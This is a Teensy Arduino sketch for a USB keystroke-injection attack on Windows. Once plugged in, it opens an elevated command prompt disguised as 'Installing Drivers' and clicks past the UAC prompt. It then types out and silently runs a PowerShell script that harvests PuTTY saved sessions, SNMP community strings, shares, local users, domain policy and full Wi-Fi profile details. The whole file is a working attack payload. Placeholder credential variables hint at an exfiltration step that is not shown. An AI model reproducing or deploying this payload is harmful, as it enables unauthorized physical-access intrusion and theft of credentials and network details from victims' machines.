#define TEENSY2
#ifdef TEENSY2
    #include<usb_private.h>
#endif



void setup(){
  delay(3000);
  wait_for_drivers(2000);

  minimise_windows();
  delay(500);
  while(!cmd_admin(3,500))
  {
  reset_windows_desktop(2000);
  }

  Keyboard.println("echo $pn = $env:COMPUTERNAME + \"  Info\" > %temp%\\in.ps1");
  Keyboard.println("echo $user = \"INPUT1\" >> %temp%\\in.ps1");
  Keyboard.println("echo $pass = \"INPUT2\" >> %temp%\\in.ps1");
  Keyboard.println("echo $dev = \"INPUT3\" >> %temp%\\in.ps1");
  delay(1000);
  Keyboard.println("echo function regv($rk, $rg,$ch) >> %temp%\\in.ps1");
  Keyboard.println("echo { >> %temp%\\in.ps1");
  Keyboard.println("echo if ($ch -eq \"no\"){$key = get-item $rk} >> %temp%\\in.ps1");
  Keyboard.println("echo else{$key = ls $rk} >> %temp%\\in.ps1");
  Keyboard.println("echo $key ^| >> %temp%\\in.ps1");
  Keyboard.println("echo ForEach-Object { >> %temp%\\in.ps1");
  Keyboard.println("echo $v = gp $_.PSPath >> %temp%\\in.ps1");
  Keyboard.println("echo ForEach ($value in $_.Property) >> %temp%\\in.ps1");
  Keyboard.println("echo { >> %temp%\\in.ps1");
  Keyboard.println("echo if ($rg -eq \"all\") {$v.$value} >> %temp%\\in.ps1");
  Keyboard.println("echo elseif ($rg -eq \"allname\"){$value} >> %temp%\\in.ps1");
  Keyboard.println("echo else {$v.$rg;break} >> %temp%\\in.ps1");
  Keyboard.println("echo }}} >> %temp%\\in.ps1");

  Keyboard.println("echo $o = \"Logged in users:`n\" + (regv \"hklm:\\software\\microsoft\\windows nt\\currentversion\\profilelist\" \"profileimagepath\") >> %temp%\\in.ps1");
  Keyboard.println("echo $o = $o + \"`n PS Env:`n\" + (regv \"hklm:\\software\\microsoft\\powershell\1\" \"allname\") >> %temp%\\in.ps1");
  Keyboard.println("echo $o = $o + \"`n Putty trusted hosts:`n\" + (regv \"hkcu:\\software\\simontatham\\putty\" \"allname\") >> %temp%\\in.ps1");
  Keyboard.println("echo $o = $o + \"`n Putty saved sessions:`n\" + (regv \"hkcu:\\software\\simontatham\\putty\\sessions\" \"all\") >> %temp%\\in.ps1");
  Keyboard.println("echo $o = $o + \"`n Shares:`n\" + (regv \"hklm:\\SYSTEM\\CurrentControlSet\\services\\LanmanServer\\Shares\" \"all\" \"no\") >> %temp%\\in.ps1");
  Keyboard.println("echo $o = $o + \"`n Env vars:`n\" + (regv \"hklm:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment\" \"all\" \"no\") >> %temp%\\in.ps1");
  Keyboard.println("echo $o = $o + \"`n Current user:`n\" + (regv \"hkcu:\\Volatile Environment\" \"all\" \"no\") >> %temp%\\in.ps1");
  Keyboard.println("echo $o = $o + \"`n SNMP cs:`n\" + (regv \"hklm:\\SYSTEM\\CurrentControlSet\\services\\snmp\\parameters\\validcommunities\" \"all\" \"no\") >> %temp%\\in.ps1");
  Keyboard.println("echo $o = $o + \"`n SNMP cs - user:`n\" + (regv \"hkcu:\\SYSTEM\\CurrentControlSet\\services\\snmp\\parameters\\validcommunities\" \"all\" \"no\") >> %temp%\\in.ps1");
  Keyboard.println("echo $o = $o + \"`n Installed Apps:`n\" + (regv \"hklm:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\" \"displayname\") >> %temp%\\in.ps1");
  Keyboard.println("echo $o = $o + \"`n Installed Apps - user:`n\" + (regv \"hkcu:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\" \"displayname\") >> %temp%\\in.ps1");
  Keyboard.println("echo $o = $o + \"`n Domain:`n\" + (regv \"hklm:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Group Policy\\History\\\" \"all\" \"no\") >> %temp%\\in.ps1");

  Keyboard.println("echo $o = $o + \"`n Contents of /etc/hosts:`n\" + (gc -path \"C:\\windows\\System32\\drivers\\etc\\hosts\") >> %temp%\\in.ps1");

  Keyboard.println("echo $o = $o + \"`n Running Services:`n\" + (net start) >> %temp%\\in.ps1");
  Keyboard.println("echo $o = $o + \"`n Account Policy:`n\" + (net accounts) >> %temp%\\in.ps1");
  Keyboard.println("echo $o = $o + \"`n Local users:`n\" + (net user) >> %temp%\\in.ps1");
  Keyboard.println("echo $o = $o + \"`n Local Groups:`n\" + (net localgroup) >> %temp%\\in.ps1");
  Keyboard.println("echo $o = $o + \"`n WLAN Info:`n\" + (netsh wlan show all) >> %temp%\\in.ps1");

  Keyboard.println("echo $o = $o.Replace(\"/\",\"\\\") >> %temp%\\in.ps1");
  Keyboard.println("echo $pv = $o.Replace(\"www\",\"uuu\") >> %temp%\\in.ps1");

  String fn = "in";
  


  Keyboard.println("echo Set oShell = CreateObject(\"WScript.Shell\") > %temp%\\in.vbs");
  Keyboard.println("echo oShell.Run(\"powershell.exe -ep bypass -nologo -c %temp%\\in.ps1\"),0,true >> %temp%\\in.vbs");
  delay(1000);
  Keyboard.println("wscript %temp%\\in.vbs");
  delay(3000);
  Keyboard.println("exit");

}

void loop(){}
  void wait_for_drivers(int sleep)
{
bool CapsLockTrap = is_caps_on();
while(CapsLockTrap == is_caps_on())
{
Keyboard.set_key1(KEY_CAPS_LOCK);
Keyboard.send_now();
delay(200);
Keyboard.set_modifier(0);
Keyboard.set_key1(0);
Keyboard.send_now();
delay(500);
delay(sleep);
}
Keyboard.set_key1(KEY_CAPS_LOCK);
Keyboard.send_now();
delay(200);
Keyboard.set_modifier(0);
Keyboard.set_key1(0);
Keyboard.send_now();
delay(500);
delay(sleep);
}

int ledkeys(void) {return int(keyboard_leds);}

bool is_caps_on(void) {return ((ledkeys() & 2) == 2) ? true : false;}

bool cmd_admin(int reps, int millisecs)
{
make_sure_capslock_is_off();
delay(700);
Keyboard.set_modifier(MODIFIERKEY_RIGHT_GUI);
Keyboard.send_now();
Keyboard.set_modifier(0);
Keyboard.send_now();
delay(3000);
Keyboard.print("cmd /T:01 /K \"@echo off && mode con:COLS=15 LINES=1 && title Installing Drivers\"");
delay(2000);
Keyboard.set_modifier(MODIFIERKEY_CTRL);
Keyboard.send_now();
Keyboard.set_modifier(MODIFIERKEY_CTRL | MODIFIERKEY_SHIFT);
Keyboard.send_now();
Keyboard.set_key1(KEY_ENTER);
Keyboard.send_now();
delay(200);
Keyboard.set_modifier(0);
Keyboard.set_key1(0);
Keyboard.send_now();
delay(500);
delay(7000);
send_left_enter();
delay(4000);
create_click_capslock_win();
check_for_capslock_success_teensy(reps,millisecs);
}

bool cmd(int reps, int millisecs, char *SomeCommand)
{
make_sure_capslock_is_off();
delay(700);
Keyboard.set_modifier(MODIFIERKEY_RIGHT_GUI);
Keyboard.set_key1(KEY_R);
Keyboard.send_now();

delay(500);
Keyboard.set_modifier(0);
Keyboard.set_key1(0);
Keyboard.send_now();

Keyboard.print(SomeCommand);
Keyboard.set_key1(KEY_ENTER);
Keyboard.send_now();

Keyboard.set_key1(0);
Keyboard.send_now();

delay(3000);
create_click_capslock_win();
check_for_capslock_success_teensy(reps,millisecs);
}

void make_sure_capslock_is_off(void)
{
if (is_caps_on())
{
delay(500);
Keyboard.set_key1(KEY_CAPS_LOCK);
Keyboard.send_now();
delay(200);
delay(700);
Keyboard.set_modifier(0);
Keyboard.set_key1(0);
Keyboard.send_now();
delay(500);
delay(700);
}
}

void create_click_capslock_win()
{
Keyboard.println("echo Set WshShell = WScript.CreateObject(\"WScript.Shell\"): WshShell.SendKeys \"{CAPSLOCK}\" > %temp%\\capslock.vbs");
delay(400);
Keyboard.println("wscript %temp%\\capslock.vbs");
delay(2000);
}

bool check_for_capslock_success_teensy(int reps, int millisecs)
{
unsigned int i = 0;
do
{
delay(millisecs);
if (is_caps_on())
{
make_sure_capslock_is_off();
delay(700);
return true;
}
i++;
}
while (!is_caps_on() && (i<reps));
return false;
}

void minimise_windows(void)
{
Keyboard.set_modifier(MODIFIERKEY_RIGHT_GUI);
Keyboard.set_key1(KEY_M);
Keyboard.send_now();
delay(300);
Keyboard.set_modifier(0);
Keyboard.set_key1(0);
Keyboard.send_now();
delay(500);
delay(300);
}

void reset_windows_desktop(int sleep)
{
delay(1000);
minimise_windows();
delay(sleep);
minimise_windows();
delay(sleep);
minimise_windows();
delay(200);
}

void send_left_enter(){
  delay(1000);
  Keyboard.set_key1(KEY_LEFT);
  Keyboard.send_now();
  delay(100);
  Keyboard.set_key1(0);
  Keyboard.send_now();

  Keyboard.set_key1(KEY_ENTER);
  Keyboard.send_now();
  delay(100);
  Keyboard.set_key1(0);
  Keyboard.send_now();
  }


  
